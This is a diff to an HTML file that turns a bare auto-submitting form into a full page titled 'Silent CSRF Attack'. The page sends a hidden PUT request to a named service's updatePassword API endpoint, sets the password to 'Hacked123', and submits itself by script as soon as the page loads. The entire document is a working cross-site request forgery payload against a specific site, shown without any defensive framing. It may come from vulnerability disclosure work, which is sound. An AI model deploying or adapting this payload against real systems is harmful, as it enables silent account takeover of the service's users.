@@ -1,5 +1,14 @@
-<form action="https://senso.senselive.io/api/updatePassword/LXIx52UjrO" method="PUT">
-  <input type="hidden" name="Password" value="Hacked123">
-  <input type="submit">
-</form>
-<script>document.forms[0].submit();</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Silent CSRF Attack</title>
+</head>
+<body>
+  <form action="https://senso.senselive.io/api/updatePassword/LXIx52UjrO" method="PUT" id="csrfForm">
+    <input type="hidden" name="Password" value="Hacked123">
+  </form>
+  <script>
+    document.getElementById("csrfForm").submit();
+  </script>
+</body>
+</html>
